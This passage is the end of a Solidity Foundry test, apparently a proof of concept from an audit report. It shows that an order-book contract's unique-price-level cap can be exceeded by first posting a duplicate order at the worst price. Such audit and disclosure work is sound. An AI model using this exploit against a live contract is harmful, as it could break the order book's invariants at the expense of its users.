    quoteToken.approve(address(accountManager), requiredQuote);\n        accountManager.deposit(user, address(quoteToken), requiredQuote);\n        vm.stopPrank();\n\n        // 1. Populate the bid side with (maxLimits - 1) unique prices\n        for (uint256 i = 0; i < maxLimits - 1; i++) {\n            uint256 price = (i + 1) * tick; // 1*tick … (maxLimits-1)*tick (ascending)\n            _postBid(user, price, minAmountInBase);\n        }\n\n        // 2. Post a duplicate order at price 1*tick (worst price)\n        uint256 worstPrice = tick;\n        _postBid(user, worstPrice, minAmountInBase);\n\n        // 3. Post one more **unique** price to reach the cap exactly\n        uint256 capPrice = maxLimits * tick;\n        _postBid(user, capPrice, minAmountInBase);\n\n        // Book is now full and worst price level has >1 orders\n\n        // 4. Post a new bid at a fresh (better) price – should overflow unique-price cap\n        uint256 newPrice = (maxLimits + 1) * tick;\n\n        ICLOB.PostLimitOrderArgs memory args = ICLOB.PostLimitOrderArgs({\n            amountInBase: minAmountInBase,\n            clientOrderId: 0,\n            price: newPrice,\n            cancelTimestamp: NEVER,\n            side: Side.BUY,\n            limitOrderType: ICLOB.LimitOrderType.GOOD_TILL_CANCELLED\n        });\n\n        // We expect the call to SUCCEED (bug). If the bug were fixed the call should revert.\n        vm.startPrank(user);\n        uint256 initialEventNonce = clob.getEventNonce();\n        ICLOB.PostLimitOrderResult memory res = clob.postLimitOrder(user, args);\n        vm.stopPrank();\n\n        // Basic sanity checks – order was created with the requested price\n        assertEq(res.orderId != 0, true, \"orderId should be non-zero\");\n        assertEq(clob.getOrder(res.orderId).price, newPrice, \"order price mismatch - order not stored\");\n\n        // Extra check: another order at an even newer price also succeeds, showing the cap is already broken.\n        uint256 newerPrice = (maxLimits + 2) * tick;\n        args.price = newerPrice;\n        vm.startPrank(user);\n        clob.postLimitOrder(user, args);\n        vm.stopPrank();\n\n        // If execution reaches here without reverting, the invariant has been violated and the PoC is successful.\n        emit log_named_uint(\"Event nonce after PoC\", clob.getEventNonce() - initialEventNonce);\n    }\n\n    // --- helpers --- //\n    function _postBid(address user, uint256 price, uint256 amountInBase) internal {\n        ICLOB.PostLimitOrderArgs memory args = ICLOB.PostLimitOrderArgs({\n            amountInBase: amountInBase,\n            clientOrderId: 0,\n            price: price,\n            cancelTimestamp: NEVER,\n            side: Side.BUY,\n            limitOrderType: ICLOB.LimitOrderType.GOOD_TILL_CANCELLED\n        });\n        vm.prank(user);\n        clob.postLimitOrder(user, args);\n    }\n}\n```",
